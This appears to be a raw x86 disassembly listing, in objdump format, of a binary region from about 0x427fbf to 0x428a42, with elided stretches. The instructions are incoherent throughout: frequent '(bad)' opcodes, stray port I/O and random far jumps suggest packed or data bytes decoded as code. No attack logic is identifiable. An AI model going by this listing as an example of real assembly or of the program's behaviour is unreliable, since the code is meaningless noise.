  427fbf:	lds    eax,FWORD PTR [ebx-0x12]
  427fc2:	out    dx,al
  427fc3:	mov    esi,DWORD PTR [esi-0x5decf2e4]
  427fc9:	adc    DWORD PTR [edx+0x33d46896],ebx
  427fcf:	retf   
  427fd0:	and    ecx,DWORD PTR [ebx-0x7a]
  427fd3:	cmp    DWORD PTR [edx-0x29a4f9ab],ecx
  427fd9:	out    0x98,eax
  427fdb:	add    ecx,DWORD PTR [edi+eiz*8-0x4d]
  427fdf:	mov    dh,BYTE PTR [ebx-0x47552ca5]
  427fe5:	dec    eax
  427fe6:	jo     0x427fca
  427fe8:	inc    eax
  427fe9:	test   DWORD PTR [edx+0x4e1382],ecx
	...
  428053:	add    BYTE PTR [eax],al
  428055:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  42805b:	out    dx,eax
  42805c:	cmc    
  42805d:	mov    edi,0x22b0803f
  428062:	clc    
  428063:	xchg   edx,eax
  428064:	sbb    bh,BYTE PTR [edx+0x1ad67]
  42806a:	add    BYTE PTR [ecx],al
  42806c:	add    BYTE PTR [eax],al
  42806e:	jge    0x428071
  428070:	xchg   ebp,eax
  428071:	fdivp  st(3),st
  428073:	ror    ebp,0x63
  428076:	arpl   WORD PTR [eax-0x503e8131],bx
  42807c:	sub    ecx,esp
  42807e:	stos   DWORD PTR es:[edi],eax
  42807f:	in     al,0xe
  428081:	add    BYTE PTR [ebp+0x1b627787],dh
  428087:	shl    cl,cl
  428089:	lods   al,BYTE PTR ds:[esi]
  42808a:	sub    ah,BYTE PTR [eax-0x29]
  42808d:	dec    ebx
  42808e:	in     eax,0x85
  428090:	in     al,0xca
  428092:	out    0xfb,al
  428094:	cmp    esi,ebx
  428096:	pop    ss
  428097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428098:	loope  0x42809e
  42809a:	or     eax,DWORD PTR [ebp+0x59]
  42809d:	test   eax,0xeb2bea7
  4280a2:	adc    BYTE PTR [esi+0x1e08e8a8],bh
  4280a8:	enter  0x3238,0xd0
  4280ac:	out    0xc,al
  4280ae:	add    DWORD PTR [ebp+0x6d],0x15e31cf
  4280b5:	sub    al,0xf0
  4280b7:	(bad)  
  4280b8:	rcl    bh,cl
  4280ba:	ins    BYTE PTR es:[edi],dx
  4280bb:	dec    esp
  4280bc:	les    ebx,FWORD PTR [eax]
  4280be:	mov    DWORD PTR [ebx-0x79ba4a3a],ecx
  4280c4:	ficomp DWORD PTR fs:0x264acc87
  4280cb:	inc    eax
  4280cc:	xchg   esi,eax
  4280cd:	ja     0x428080
  4280cf:	and    BYTE PTR [esp+ebx*4-0x505b7c6c],bl
  4280d6:	pop    esp
  4280d7:	outs   dx,BYTE PTR ds:[esi]
  4280d8:	push   edx
  4280d9:	repnz pop ds
  4280db:	sub    al,0x69
  4280dd:	jp     0x428126
  4280df:	pop    edx
  4280e0:	push   ebp
  4280e1:	jle    0x42808d
  4280e3:	mov    dl,0xf5
  4280e5:	push   0x4a
  4280e7:	sbb    dl,BYTE PTR [ecx+0x20255727]
  4280ed:	(bad)  
  4280ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280ef:	jns    0x4280f5
  4280f1:	and    eax,0x9bbd8c57
  4280f6:	jns    0x42811f
  4280f8:	into   
  4280f9:	and    eax,ecx
  4280fb:	gs stos DWORD PTR es:[edi],eax
  4280fd:	xor    eax,0x211a62ca
  428102:	xchg   ecx,eax
  428103:	dec    eax
  428104:	xchg   edi,eax
  428105:	in     eax,0x2a
  428107:	call   0xb5112d9e
  42810c:	test   BYTE PTR [ebp+0x6235f37f],0xaa
  428113:	pop    ss
  428114:	cs or  eax,0xdd14db2c
  42811a:	jns    0x42817d
  42811c:	sbb    DWORD PTR [esi],edx
  42811e:	ret    
  42811f:	jecxz  0x4280f1
  428121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428122:	shr    BYTE PTR ds:0x298406a0,0x57
  428129:	out    dx,eax
  42812a:	cli    
  42812b:	jmp    0x428134
  42812d:	iret   
  42812e:	das    
  42812f:	push   ecx
  428130:	jnp    0x4280c7
  428132:	jg     0x4280e0
  428134:	push   eax
  428135:	stc    
  428136:	dec    eax
  428137:	push   ebp
  428138:	mov    eax,ds:0x3f51a1b2
  42813d:	jge    0x4281b9
  42813f:	ret    
  428140:	fcom   st(3)
  428142:	xchg   esp,eax
  428143:	pop    ebp
  428144:	jg     0x42817f
  428146:	push   ss
  428147:	push   edx
  428148:	ret    0x82b6
  42814b:	jb     0x4281ba
  42814d:	push   esi
  42814e:	mov    esp,0xa5e32c3b
  428153:	xor    DWORD PTR [eax+eiz*2],esi
  428156:	sub    edx,DWORD PTR [esi]
  428158:	inc    eax
  428159:	inc    edx
  42815a:	pop    eax
  42815b:	push   0xd05d0bfa
  428160:	mov    ecx,0xb2633449
  428165:	test   al,0x3
  428167:	pop    es
  428168:	and    DWORD PTR [ecx],ecx
  42816a:	icebp  
  42816b:	fld    TBYTE PTR [esi+0x79]
	...
  4281d6:	fucomip st,st(6)
  4281d8:	std    
  4281d9:	dec    esp
  4281da:	std    
  4281db:	pop    edi
  4281dc:	(bad)  
  4281dd:	call   FWORD PTR [edx]
  4281df:	xchg   edi,eax
  4281e0:	pop    esp
  4281e1:	push   ecx
  4281e2:	pop    es
  4281e3:	mov    cl,0x2a
  4281e5:	pop    ebx
  4281e6:	scas   al,BYTE PTR es:[di]
  4281e8:	add    DWORD PTR [eax],eax
  4281ea:	add    BYTE PTR [ecx],al
  4281ec:	add    BYTE PTR [eax],al
  4281ee:	fcom   DWORD PTR ss:[edx]
  4281f1:	imul   ebx,DWORD PTR [ebp-0x16],0x34
  4281f5:	adc    BYTE PTR [esi+0x25],bl
  4281f8:	xchg   edi,eax
  4281f9:	mov    ebp,0xa08f5b44
  4281fe:	sub    al,bl
  428200:	pop    ebx
  428201:	loope  0x4281cb
  428203:	(bad)  
  428204:	sbb    edx,DWORD PTR [ebp-0x31f8859a]
  42820a:	outs   dx,BYTE PTR ds:[esi]
  42820b:	sbb    al,0xc6
  42820d:	dec    ecx
  42820e:	and    al,0x54
  428210:	xchg   esp,eax
  428211:	leave  
  428212:	or     DWORD PTR [ebx-0x5dba70cb],ecx
  428218:	dec    ebp
  428219:	xor    esi,DWORD PTR [ebx+edx*8]
  42821c:	or     DWORD PTR [ebp-0x7ca2499a],edx
  428222:	inc    edx
  428223:	adc    eax,0x1e73b9e9
  428228:	test   al,0xb4
  42822a:	xchg   ebx,eax
  42822b:	ins    DWORD PTR es:[edi],dx
  42822c:	popf   
  42822d:	cli    
  42822e:	pop    ebp
  42822f:	sub    eax,0x338ffe64
  428234:	mov    fs,WORD PTR [edx+0x65464b85]
  42823a:	push   esp
  42823b:	in     eax,0x57
  42823d:	fsubr  DWORD PTR [ecx]
  42823f:	dec    eax
  428240:	loop   0x428295
  428242:	leave  
  428243:	jmp    0x4281fe
  428245:	enter  0x4534,0x11
  428249:	inc    ecx
  42824a:	aad    0xdc
  42824c:	je     0x428214
  42824e:	sub    edi,esp
  428250:	add    BYTE PTR [ebp-0x39fe3c8e],0x96
  428257:	imul   eax,DWORD PTR [esi-0x3e],0xffffffc0
  42825b:	loope  0x428293
  42825d:	retf   
  42825e:	inc    ebp
  42825f:	mov    esp,0xb4040b6d
  428264:	ds repz adc ch,dl
  428268:	or     edx,DWORD PTR [edx+edi*8-0x1bcdcc81]
  42826f:	xchg   ebp,eax
  428270:	nop
  428271:	or     BYTE PTR ds:[ecx+ebp*1+0x6cfb5efd],0x53
  42827a:	ds push ecx
  42827c:	outs   dx,BYTE PTR ds:[esi]
  42827d:	cli    
  42827e:	inc    eax
  42827f:	add    DWORD PTR [ebx-0x2cd2a8cb],eax
  428285:	idiv   DWORD PTR [ebx+edi*1]
  428288:	mov    ds:0x77da95f9,eax
  42828d:	fadd   st(5),st
  42828f:	inc    ebx
  428290:	pop    eax
  428291:	dec    esp
  428292:	push   edi
  428293:	das    
  428294:	aas    
  428295:	adc    eax,0xc54ab69c
  42829a:	mov    ch,0x3d
  42829c:	ins    BYTE PTR es:[edi],dx
  42829d:	test   al,0xb3
  42829f:	lods   al,BYTE PTR ds:[esi]
  4282a0:	and    ah,dl
  4282a2:	inc    ebx
  4282a3:	cmp    al,0xbe
  4282a5:	mov    BYTE PTR [edx+0x19],cl
  4282a8:	(bad)  
  4282aa:	sub    DWORD PTR [ebp+0x4e],ebp
  4282ad:	scas   al,BYTE PTR es:[edi]
  4282ae:	pop    ss
  4282af:	bound  edx,QWORD PTR [eax-0x64f9dfbd]
  4282b5:	sub    al,0xd7
  4282b7:	mov    ds:0xc0463271,eax
  4282bc:	dec    edx
  4282bd:	dec    edi
  4282be:	push   ss
  4282bf:	sti    
  4282c0:	xchg   ebx,eax
  4282c1:	test   al,0x75
  4282c3:	lods   al,BYTE PTR ds:[esi]
  4282c4:	and    DWORD PTR [ebp-0x3d],edx
  4282c7:	outs   dx,DWORD PTR ds:[esi]
  4282c8:	sub    DWORD PTR [edi+0x68ed1c3a],edi
  4282ce:	sbb    DWORD PTR [ebx+edx*2],0x257b29c8
  4282d5:	fist   DWORD PTR [edx-0x99064f0]
  4282db:	ins    DWORD PTR es:[edi],dx
  4282dc:	addr16 leave 
  4282de:	call   DWORD PTR [ebx+0x25e0d3a3]
  4282e4:	imul   ecx,DWORD PTR [ebp+0x79035421],0x6b
  4282eb:	mov    dh,0x8f
  4282ed:	xchg   ebx,eax
	...
  428356:	(bad)  
  428357:	fidiv  WORD PTR [esi]
  428359:	loop   0x42839a
  42835b:	jmp    0x5c37:0x7b70ffd7
  428362:	sbb    cl,dl
  428364:	push   0x1af6779
  428369:	add    BYTE PTR [eax],al
  42836b:	add    DWORD PTR [eax],eax
  42836d:	add    ch,al
  42836f:	retf   
  428370:	ret    
  428371:	sbb    bh,bl
  428373:	and    al,0x71
  428375:	adc    eax,0xeb750770
  42837a:	lea    edi,[eax+0x6]
  42837d:	xor    DWORD PTR [eax+0x6a],ebp
  428380:	pop    ecx
  428381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428382:	or     bh,BYTE PTR [ebp-0xb]
  428385:	xor    BYTE PTR [eax-0x4d],ch
  428388:	inc    edx
  428389:	jle    0x42834d
  42838b:	ret    
  42838c:	ret    0x4d2d
  42838f:	imul   esi,ebp,0xffffff83
  428392:	dec    edi
  428393:	xchg   ebp,eax
  428394:	adc    DWORD PTR [ebx-0x78],eax
  428397:	jne    0x42831d
  428399:	sbb    bh,BYTE PTR [edi+eax*8]
  42839c:	(bad)
  42839f:	bound  ecx,QWORD PTR [esp+eax*2-0x3c]
  4283a3:	add    DWORD PTR [ebx+0x44285f01],esi
  4283a9:	xor    edi,DWORD PTR [esi+0x64d58d]
  4283af:	jg     0x428418
  4283b1:	xchg   ebp,eax
  4283b2:	cmp    al,0x45
  4283b4:	and    eax,0x3733e903
  4283b9:	push   0x29
  4283bb:	pushw  es
  4283bd:	popa   
  4283be:	sub    ebp,DWORD PTR [ebx+eiz*8]
  4283c1:	jge    0x428386
  4283c3:	imul   ebx,eax,0xed963067
  4283c9:	pop    es
  4283ca:	xor    BYTE PTR [esi+eax*8-0x686048a5],cl
  4283d1:	ins    BYTE PTR es:[edi],dx
  4283d2:	pop    eax
  4283d3:	push   ecx
  4283d4:	xor    ebx,ecx
  4283d6:	out    dx,eax
  4283d7:	pop    es
  4283d8:	xchg   ecx,eax
  4283d9:	xchg   ebp,eax
  4283da:	inc    eax
  4283db:	dec    esi
  4283dc:	mov    cs,ecx
  4283de:	out    dx,eax
  4283df:	imul   ebx,DWORD PTR [ebx-0x1cba1a97],0xb668a491
  4283e9:	aas    
  4283ea:	jmp    0xab7e5ac6
  4283ef:	sbb    al,0x8
  4283f1:	inc    ecx
  4283f2:	xlat   BYTE PTR ds:[ebx]
  4283f3:	popa   
  4283f4:	xchg   edx,eax
  4283f5:	jb     0x428397
  4283f7:	scas   al,BYTE PTR es:[edi]
  4283f8:	repnz sar BYTE PTR [edi-0x1522121c],1
  4283ff:	shl    BYTE PTR ds:0x3a529da3,1
  428405:	retf   0x9f33
  428408:	pop    edx
  428409:	cmp    DWORD PTR [eax],0x57
  42840c:	dec    esp
  42840d:	sub    al,0xce
  42840f:	mov    bh,0xe6
  428411:	cmp    DWORD PTR [ecx],eax
  428413:	inc    ebx
  428414:	jae    0x428469
  428416:	shl    DWORD PTR [esi],cl
  428418:	mov    al,0x49
  42841a:	inc    ebx
  42841b:	das    
  42841c:	and    esi,ecx
  42841e:	add    al,0x3c
  428420:	adc    DWORD PTR [eax-0x79886876],ecx
  428426:	xor    edi,DWORD PTR [ebx-0x6d71d785]
  42842c:	(bad)  
  42842e:	pop    edx
  42842f:	sbb    DWORD PTR [eax+edx*2],edi
  428432:	nop
  428433:	cs enter 0xfce,0x9d
  428438:	nop
  428439:	sbb    DWORD PTR [edx],ebp
  42843b:	scas   al,BYTE PTR es:[edi]
  42843c:	dec    esp
  42843d:	das    
  42843e:	mov    ss,WORD PTR ss:[ecx+0x5d]
  428442:	xchg   ebx,eax
  428443:	cmp    DWORD PTR [ebp-0x112d6992],eax
  428449:	jnp    0x42847a
  42844b:	pusha  
  42844c:	popa   
  42844d:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  42844f:	push   edi
  428450:	shl    DWORD PTR [ecx],cl
  428452:	das    
  428453:	stos   DWORD PTR es:[edi],eax
  428454:	sbb    al,0x58
  428456:	fisttp WORD PTR [ecx]
  428458:	(bad)  
  428459:	pop    esp
  42845a:	sub    al,0x94
  42845c:	test   BYTE PTR [esi-0x6b],ch
  42845f:	xor    eax,0x771c5dfb
  428464:	inc    ebx
  428465:	fadd   QWORD PTR [eax-0x7a71972a]
  42846b:	in     eax,0xf0
  42846d:	cmp    DWORD PTR [eax],eax
	...
  4284d3:	add    BYTE PTR [eax],al
  4284d5:	add    BYTE PTR [esi],cl
  4284d7:	xchg   esp,eax
  4284d8:	jg     0x42853d
  4284da:	(bad)  
  4284db:	jmp    0x4284fb
  4284dd:	std    
  4284de:	mov    edi,0x8eabfb32
  4284e3:	(bad)  
  4284e4:	sub    ebx,edi
  4284e6:	addr16 mov al,0x1
  4284e9:	add    BYTE PTR [eax],al
  4284eb:	add    DWORD PTR [eax],eax
  4284ed:	add    al,dl
  4284ef:	sbb    al,0xde
  4284f1:	adc    BYTE PTR [eax-0x23],ah
  4284f4:	rcl    BYTE PTR [eax],1
  4284f6:	mov    ds:0x8943550f,eax
  4284fb:	nop
  4284fc:	dec    eax
  4284fd:	xlat   BYTE PTR ds:[ebx]
  4284fe:	sbb    DWORD PTR [eax-0x3b95df5e],esi
  428504:	xor    ebx,DWORD PTR [edx+0x57]
  428507:	push   ecx
  428508:	push   ss
  428509:	int3   
  42850a:	push   0x7a
  42850c:	and    eax,0x665f9b47
  428511:	pop    edx
  428512:	inc    ecx
  428513:	cli    
  428514:	cmc    
  428515:	sub    ebp,DWORD PTR [ebx+0x4b28efb8]
  42851b:	inc    ebx
  42851c:	jg     0x4284cb
  42851e:	mov    DWORD PTR [eax],ecx
  428520:	sti    
  428521:	xor    esi,DWORD PTR [eax+0x4d2798e]
  428527:	pop    eax
  428528:	les    edi,FWORD PTR [ecx-0x2e]
  42852b:	(bad)  
  42852c:	rcl    BYTE PTR [esi-0x4fc08321],0xf6
  428533:	pop    esp
  428534:	add    eax,0xe394877c
  428539:	shr    BYTE PTR [ecx],cl
  42853b:	push   edi
  42853c:	cwde   
  42853d:	jp     0x428515
  42853f:	sbb    DWORD PTR [ebp+0x225b6e89],ecx
  428545:	or     ebx,DWORD PTR [eax+0x7c]
  428548:	dec    edi
  428549:	fsub   QWORD PTR [esi-0x77]
  42854c:	dec    eax
  42854d:	adc    al,0xe4
  42854f:	outs   dx,DWORD PTR ds:[esi]
  428550:	shr    BYTE PTR [eax],cl
  428552:	popf   
  428553:	inc    esi
  428554:	push   esi
  428555:	add    DWORD PTR [edi+ecx*1],ecx
  428558:	mov    ?,edx
  42855a:	cmp    ah,BYTE PTR fs:[edi]
  42855d:	mov    dl,0x8a
  42855f:	icebp  
  428560:	dec    ebp
  428561:	push   0xffffffdd
  428563:	cli    
  428564:	jb     0x428527
  428566:	xor    eax,0xf8821fab
  42856b:	es popa 
  42856d:	popf   
  42856e:	cdq    
  42856f:	(bad)  
  428570:	add    esi,esp
  428572:	inc    edx
  428573:	mov    edx,DWORD PTR [eax]
  428575:	in     eax,0xf5
  428577:	es jecxz 0x428594
  42857a:	jg     0x4285c8
  42857c:	lahf   
  42857d:	in     eax,0x58
  42857f:	pop    esp
  428580:	pop    es
  428581:	mov    eax,ds:0xc5a9761c
  428586:	imul   edi,DWORD PTR [ecx+eax*4],0x433c3c93
  42858d:	(bad)  
  42858e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42858f:	sbb    eax,0xb3358a50
  428594:	dec    ebx
  428595:	push   ss
  428596:	dec    esp
  428597:	jbe    0x4285aa
  428599:	(bad)
  42859c:	les    esp,FWORD PTR [ebx-0x3f]
  42859f:	mov    dl,0x95
  4285a1:	popf   
  4285a2:	shl    BYTE PTR [eax],cl
  4285a4:	ss (bad) 
  4285a7:	mov    ecx,ebp
  4285a9:	int    0x3f
  4285ab:	lahf   
  4285ac:	(bad)  
  4285ae:	cmc    
  4285af:	lods   eax,DWORD PTR ds:[esi]
  4285b0:	jmp    0x6672e746
  4285b5:	xchg   ebp,eax
  4285b6:	(bad)  
  4285b7:	jecxz  0x4285e8
  4285b9:	sti    
  4285ba:	aad    0xee
  4285bc:	xor    ebp,eax
  4285be:	push   edi
  4285bf:	cmp    eax,0x7e8eb3d0
  4285c4:	mov    al,0xec
  4285c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4285c8:	mov    ?,edi
  4285ca:	push   esp
  4285cb:	mov    al,0xe5
  4285cd:	(bad)  
  4285ce:	fisttp DWORD PTR [ecx]
  4285d0:	push   cs
  4285d1:	dec    esi
  4285d2:	inc    esp
  4285d3:	jae    0x428627
  4285d5:	pushf  
  4285d6:	sbb    BYTE PTR [ebp+0x1a],0x8d
  4285da:	outs   dx,BYTE PTR ds:[esi]
  4285db:	inc    eax
  4285dc:	into   
  4285dd:	cmp    al,0xa8
  4285df:	in     eax,dx
  4285e0:	aas    
  4285e1:	div    BYTE PTR [ebp-0x129aa951]
  4285e7:	dec    ebp
  4285e8:	jmp    0x90:0x34810d0
	...
  428653:	add    BYTE PTR [eax],al
  428655:	add    BYTE PTR [ecx-0xa],dl
  428658:	xor    eax,0x5bffb73e
  42865d:	inc    edi
  42865f:	mov    esi,0x62faa3f6
  428664:	dec    edx
  428665:	fbld   TBYTE PTR [edi-0x4f]
  428668:	add    DWORD PTR [eax],eax
  42866a:	add    BYTE PTR [ecx],al
  42866c:	add    BYTE PTR [eax],al
  42866e:	mov    BYTE PTR [eax-0x41a8a878],al
  428674:	sub    BYTE PTR [ebp-0x8699065],bh
  42867a:	je     0x42867f
  42867c:	push   0x39
  42867e:	out    0x3f,eax
  428680:	cwde   
  428681:	xchg   edi,esp
  428683:	pop    esp
  428684:	or     ecx,DWORD PTR [edi-0x73068a90]
  42868a:	add    al,0xbc
  42868c:	cli    
  42868d:	inc    esi
  42868e:	dec    edx
  42868f:	and    al,0x4e
  428691:	mov    al,0xe8
  428693:	cmc    
  428694:	cmp    BYTE PTR [ebx-0x52],0x58
  428698:	add    al,0xab
  42869a:	dec    edx
  42869b:	loopne 0x4286da
  42869d:	aad    0xce
  42869f:	lea    ebp,[edx+ebx*4-0x71861c8f]
  4286a6:	les    esi,FWORD PTR [edi+0x249b1d30]
  4286ac:	add    DWORD PTR ds:0x79c7b988,ebp
  4286b2:	sub    BYTE PTR ss:[ebp+0x34f41d3c],ah
  4286b9:	fsubr  st,st(5)
  4286bb:	bound  ebp,QWORD PTR [ebp+0xf]
  4286be:	les    ebx,FWORD PTR ds:0x3e2df741
  4286c4:	sub    ecx,DWORD PTR [ebx]
  4286c6:	js     0x4286f7
  4286c8:	xchg   ecx,eax
  4286c9:	sub    ebx,esp
  4286cb:	js     0x428747
  4286cd:	call   0xeaba5839
  4286d2:	push   ebp
  4286d3:	pop    ds
  4286d4:	jo     0x428713
  4286d6:	push   cs
  4286d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4286d8:	js     0x428747
  4286da:	lock mov esp,DWORD PTR [eax]
  4286dd:	aas    
  4286de:	in     al,dx
  4286df:	imul   ecx,edx,0xb4aacdc
  4286e5:	test   DWORD PTR ds:0x367fd7b3,0x1b446617
  4286ef:	popf   
  4286f0:	or     dh,BYTE PTR [ebp-0x255572ef]
  4286f6:	fistp  DWORD PTR [ebx+0x42f79d0d]
  4286fc:	enter  0xacc,0x74
  428700:	fldenv [edi+0xcba58a8]
  428706:	bound  edx,QWORD PTR [ebp-0x33d3f012]
  42870c:	repnz adc ebp,ebx
  42870f:	out    0x19,eax
  428711:	call   FWORD PTR [eax+edi*1+0x2a48a80]
  428718:	dec    ebx
  428719:	lgs    eax,FWORD PTR [edi]
  42871c:	xor    BYTE PTR [ebp-0x7],al
  42871f:	fsubp  st(1),st
  428721:	jb     0x4286f1
  428723:	add    DWORD PTR [edi-0x34],edx
  428726:	(bad)  
  428727:	popf   
  428728:	aad    0x46
  42872a:	rol    BYTE PTR [esi-0x524c401b],0x5c
  428731:	lock loop 0x4286e2
  428734:	lea    esp,[ebx+0x55526be4]
  42873a:	popf   
  42873b:	scas   eax,DWORD PTR es:[edi]
  42873c:	and    al,0xb7
  42873e:	scas   al,BYTE PTR es:[edi]
  42873f:	mov    BYTE PTR [edx-0x2b],dh
  428742:	jmp    0x45be:0x24737ac
  428749:	cmp    BYTE PTR [ebp+edi*8+0x4f31460e],dl
  428750:	das    
  428751:	stos   DWORD PTR es:[edi],eax
  428752:	js     0x42873a
  428754:	cwde   
  428755:	out    0x1b,al
  428757:	enter  0x32bb,0x29
  42875b:	mov    edx,0x1796a720
  428760:	sbb    eax,0xa1eeb103
  428765:	(bad)  
  428766:	or     WORD PTR [edx+0x4f],ax
  42876a:	lods   eax,DWORD PTR ds:[esi]
  42876b:	arpl   WORD PTR [ecx-0x5b],di
	...
  4287d6:	push   esi
  4287d7:	pop    ebx
  4287d8:	xor    al,0x78
  4287da:	cmp    eax,0xe77f5e7f
  4287df:	inc    ebp
  4287e0:	call   0x635f4cf8
  4287e5:	sbb    al,0x67
  4287e7:	mov    dl,0x1
  4287e9:	add    BYTE PTR [eax],al
  4287eb:	add    DWORD PTR [eax],eax
  4287ed:	add    dh,bl
  4287ef:	push   eax
  4287f0:	out    0x23,eax
  4287f2:	and    BYTE PTR [eax],cl
  4287f4:	xchg   edx,eax
  4287f5:	fidivr WORD PTR [esi-0x5eb164a3]
  4287fb:	test   BYTE PTR [edi+0x1a991e84],bl
  428801:	dec    edx
  428802:	out    0x5,al
  428804:	fild   DWORD PTR [ecx]
  428806:	pop    edi
  428807:	das    
  428808:	mov    al,ds:0x8e257ae9
  42880d:	add    BYTE PTR [esi+0x5690520c],cl
  428813:	adc    ebx,DWORD PTR [ecx-0x70c73318]
  428819:	(bad)  
  42881a:	enter  0x8f3f,0x6a
  42881e:	add    ch,BYTE PTR [ebp-0x29]
  428821:	adc    BYTE PTR [ebp-0x2017a39d],ah
  428827:	sbb    ebp,DWORD PTR [ebx-0x2fd37fcb]
  42882d:	mov    edx,0x6e13b488
  428832:	mov    eax,eax
  428834:	lds    ebx,FWORD PTR [ebx+0x6f]
  428837:	das    
  428838:	clc    
  428839:	jae    0x428810
  42883b:	push   0x37efbd64
  428840:	fdivr  DWORD PTR [ecx]
  428842:	outs   dx,BYTE PTR ds:[esi]
  428843:	je     0x42886e
  428845:	std    
  428846:	cdq    
  428847:	push   ds
  428848:	aad    0xf8
  42884a:	mov    ds:0x29a1ba2f,eax
  42884f:	test   eax,0x2c85f4d5
  428854:	mov    cl,0x4
  428856:	and    eax,0x837df812
  42885b:	fsub   QWORD PTR [ebp-0x433af28e]
  428861:	retf   0x86c2
  428864:	out    0xfa,eax
  428866:	push   ds
  428867:	sbb    al,0xc4
  428869:	dec    edi
  42886a:	clc    
  42886b:	stc    
  42886c:	pop    es
  42886d:	sbb    dl,BYTE PTR [ecx+0x27]
  428870:	inc    ebp
  428871:	jae    0x4288d0
  428873:	das    
  428874:	sbb    edx,DWORD PTR [edx+0x17d7578f]
  42887a:	(bad)  
  42887b:	call   0x2c43503e
  428880:	pop    esi
  428881:	jbe    0x428806
  428883:	inc    edx
  428884:	gs ret 0xf7fc
  428888:	jb     0x428879
  42888a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42888b:	rcr    bh,0x52
  42888e:	jp     0x42882d
  428890:	sbb    BYTE PTR [eax+0x1adf978a],cl
  428896:	in     eax,0x7e
  428898:	lds    ecx,FWORD PTR [ecx+0x49]
  42889b:	sub    al,0xe
  42889d:	mov    bl,0x41
  42889f:	loop   0x4288d4
  4288a1:	aaa    
  4288a2:	jnp    0x4288e7
  4288a4:	loop   0x4288c6
  4288a6:	scas   al,BYTE PTR es:[edi]
  4288a7:	sbb    esp,DWORD PTR [ebp+0x6454af61]
  4288ad:	cmp    eax,0x421e997d
  4288b2:	xbegin 0x5701bc58
  4288b8:	popa   
  4288b9:	xchg   BYTE PTR [edi-0x2e],dl
  4288bc:	push   edi
  4288bd:	and    DWORD PTR [esi+0x9],ebp
  4288c0:	xlat   BYTE PTR ds:[ebx]
  4288c1:	gs in  al,dx
  4288c3:	lock add eax,0xc2ed521d
  4288c9:	pushf  
  4288ca:	fs into 
  4288cc:	mov    fs,WORD PTR [edi+ecx*2]
  4288cf:	pop    esp
  4288d0:	loopne 0x428944
  4288d2:	cmp    ebp,DWORD PTR [edi+0x46]
  4288d5:	ss xor al,0x88
  4288d8:	dec    edi
  4288d9:	shr    ebx,1
  4288db:	inc    esp
  4288dc:	lock enter 0x97f5,0x89
  4288e1:	sbb    al,0xd2
  4288e3:	cmp    edx,DWORD PTR [ebx+0xc391bb7]
  4288e9:	scas   al,BYTE PTR es:[edi]
  4288ea:	aam    0xba
  4288ec:	push   ebp
  4288ed:	and    BYTE PTR [eax],al
	...
  428953:	add    BYTE PTR [eax],al
  428955:	add    BYTE PTR [esi],ah
  428957:	jp     0x4289ca
  428959:	les    edi,FWORD PTR [ebp-0x31]
  42895c:	mov    bh,0xfa
  42895e:	arpl   WORD PTR [esi-0x120b62f1],bx
  428964:	pop    ss
  428965:	mov    dh,0x67
  428967:	mov    bl,0x1
  428969:	add    BYTE PTR [eax],al
  42896b:	add    DWORD PTR [eax],eax
  42896d:	add    BYTE PTR [edi],ah
  42896f:	int    0xf0
  428971:	and    esp,DWORD PTR ds:0x78d5d598
  428977:	cmp    bh,al
  428979:	inc    ebx
  42897a:	sub    eax,0xc1025f69
  42897f:	arpl   WORD PTR cs:[eax-0xf],bx
  428983:	mov    es,WORD PTR [esi+0x406014fa]
  428989:	nop
  42898a:	popa   
  42898b:	xchg   DWORD PTR [eax-0x4eb181ed],esi
  428991:	outs   dx,DWORD PTR ds:[esi]
  428992:	pop    eax
  428993:	mov    ch,0x7
  428995:	ins    BYTE PTR es:[edi],dx
  428996:	mov    eax,0xb8f48a3f
  42899b:	std    
  42899c:	fld    DWORD PTR [ebx-0x7f]
  42899f:	pop    ebp
  4289a0:	call   0x4e75:0x447e16ea
  4289a7:	or     al,0x53
  4289a9:	repz ja 0x428a08
  4289ac:	ins    DWORD PTR es:[edi],dx
  4289ad:	clc    
  4289ae:	mov    ebx,0x1e9a15b4
  4289b3:	fisubr WORD PTR [esi-0x126a4114]
  4289b9:	pop    edi
  4289ba:	adc    BYTE PTR [edx+0x71],bh
  4289bd:	lods   al,BYTE PTR ds:[esi]
  4289be:	or     al,0x76
  4289c0:	gs mov ebp,esp
  4289c3:	dec    edx
  4289c4:	xor    al,BYTE PTR [ecx-0x512d4335]
  4289ca:	lods   eax,DWORD PTR ds:[esi]
  4289cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4289cc:	fmulp  st(3),st
  4289ce:	jl     0x428956
  4289d0:	jno    0x4289ef
  4289d2:	jp     0x4289bc
  4289d4:	xor    BYTE PTR [ebx-0x66],bl
  4289d7:	jnp    0x4289c4
  4289d9:	and    edx,ebx
  4289db:	packssdw mm0,mm1
  4289de:	ror    edx,0x8c
  4289e1:	mov    ah,0x57
  4289e3:	(bad)  
  4289e4:	iret   
  4289e5:	inc    eax
  4289e6:	hlt    
  4289e7:	inc    ebp
  4289e8:	repz cld 
  4289ea:	jno    0x428a3f
  4289ec:	adc    BYTE PTR [edx],bl
  4289ee:	inc    esi
  4289ef:	mov    ebx,0xbbb159e8
  4289f4:	mov    bh,0xdd
  4289f6:	retf   
  4289f7:	sub    DWORD PTR [eax+0x3d4a0588],esi
  4289fd:	ss sub al,0xa3
  428a00:	icebp  
  428a01:	rcl    bl,cl
  428a03:	mov    cl,0xb6
  428a05:	mov    ebp,0xb831ad49
  428a0a:	xor    ecx,DWORD PTR [esi+eiz*1]
  428a0d:	arpl   bx,di
  428a0f:	mov    al,ds:0xaa8a7b08
  428a14:	pusha  
  428a15:	mov    ebp,0x8a0c46e
  428a1a:	call   0x9e303a55
  428a1f:	mov    cs,WORD PTR [eax]
  428a21:	test   eax,0x236dac3c
  428a26:	retf   
  428a27:	mov    ch,0xe8
  428a29:	aaa    
  428a2a:	push   0x5effca0a
  428a2f:	aaa    
  428a30:	lock jo 0x428a8c
  428a33:	mov    ecx,0xbae4b706
  428a38:	sub    edx,edx
  428a3a:	lea    ebx,gs:[ebp+0x25]
  428a3e:	cmp    BYTE PTR [edx],ah
  428a40:	std    
  428a41:	nop
  428a42:	jge    0x4289ec
